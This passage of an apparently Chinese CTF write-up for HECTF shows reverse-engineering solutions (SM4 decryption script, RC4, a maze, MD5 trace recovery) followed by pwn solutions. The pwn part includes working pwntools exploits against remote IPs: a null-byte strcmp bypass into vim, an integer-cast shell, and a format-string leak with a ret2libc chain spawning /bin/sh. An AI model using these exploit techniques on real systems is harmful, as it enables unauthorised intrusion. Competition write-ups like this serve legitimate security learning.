class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SM4Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># 将 128bit 转化成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># 结果逆序</span></span><br><span class="line">        <span class="comment"># 将 4x32bit 合并成 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;密钥生成&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># 将 128bit 拆分成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># 循环生成轮密钥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_rot_left</span>(<span class="params">n, m</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;循环左移&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;</span>)  <span class="comment"># 128bit密钥</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动调测试加密</span></span><br><span class="line"><span class="comment"># plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;)  # 128bit明文</span></span><br><span class="line"><span class="comment"># print(sm4.encrypt(plaintext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;D75CDA22176DD392A1A570915F66A61C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sm4.decrypt(c).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6f2069d8ab245446d789590d2cfe20d6</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h3><blockquote><p>still ez</p></blockquote><p>识别代码逻辑为RC4算法，key为 <code>thiskey</code>，提取密文hex为 <code>C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946</code>，</p><p>Cyberchef解出flag：<code>HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125;</code></p><p>​    </p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>分析代码逻辑，为8层8*8迷宫，其中0为可走方块，1为不可走方块，wsad为上下左右，u为下一层，n为上一层。</p><p>将8层01迷宫矩阵打印出来，从第一层 (0,0) 手动模拟走迷宫，得到路径 <code>ssddssuuwwddndduuussdussasauudd</code>，加上HECTF{}即为flag。</p><p>​    </p><h3 id="还原md5"><a href="#还原md5" class="headerlink" title="还原md5"></a>还原md5</h3><blockquote><p>MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613  哈哈哈，逆去吧</p><p>HINTS:</p><p>注意，re题目md5的flag提交时不需要再套HECTF{}</p></blockquote><p>txt内容像是调用libsfdata.so计算md5过程汇编操作记录，既然是全过程，肯定有读入原始数据，以16进制存入寄存器或内存的痕迹，HECT的hex值”48454354“，注意是小端序，全局搜索 <code>54434548</code>，找到 <code>r6=0x54434548</code> 疑似读入寄存器操作，继续全局搜索 <code>=&gt; r6=0x</code>，有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548</span><br><span class="line">Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46</span><br><span class="line">Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32</span><br><span class="line">Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636</span><br><span class="line">Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237</span><br><span class="line">Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338</span><br><span class="line">Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059</span><br><span class="line">Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61</span><br><span class="line">Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431</span><br><span class="line">Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964</span><br><span class="line">Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6e</span><br><span class="line">Line 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576</span><br></pre></td></tr></table></figure><p>提取出r6的值hex转字符即为flag：<code>HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw</code></p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>先利用 <code>\x00</code> 截断绕过 <code>strcmp</code> 比较，进入 <code>system(&#39;vim -R&#39;)</code> 的vim交互模式，再使用vim命令 <code>:e 文件名</code> 读取flag内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.111.50&#x27;</span>,<span class="number">32365</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;:e flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>值得注意的是，由于进入vim命令会清空终端内容，在pwntools交互下读取的内容会被瞬间刷掉，可以将输出重定向到文件，获取到flag内容输出：</p><p><code>python test.py &gt; output.txt</code></p><p>​    </p><h3 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h3><blockquote><p>听说你还没签上到</p></blockquote><p>int类型强制转换为char，当值为128~255时变成负数，模拟伪代码，在最大值2147483647附近尝试寻找所需数字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">2147483646</span><span class="number">-124</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line"><span class="type">int</span> y = x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">char</span>)y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">char</span>)y&lt;<span class="number">-125</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, y&gt;<span class="number">255</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2147483522满足条件，传入后getshell拿到flag。</p><p>​    </p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>程序开了PIE，gdb动调，利用格式化字符串漏洞泄露当前函数地址，再减去偏移得到程序基址，剩下的部分简单ret2libc即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.102.43&#x27;</span>,<span class="number">31550</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>))-<span class="number">0x123a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = pie_base+<span class="number">0x1333</span></span><br><span class="line">pop_rsi_r15 = pie_base+<span class="number">0x1331</span></span><br><span class="line">ret = pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_got = pie_base+elf.got.puts</span><br><span class="line">puts_plt = pie_base+elf.plt.puts</span><br><span class="line">get = pie_base+<span class="number">0x12ab</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(get)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h3><p>txt内为音符加密，使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线解密工具</a>解密得到flag。</p><p>​    </p><h3 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h3><p>出题失误，源码泄露拿到flag。</p><p>​    </p><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span 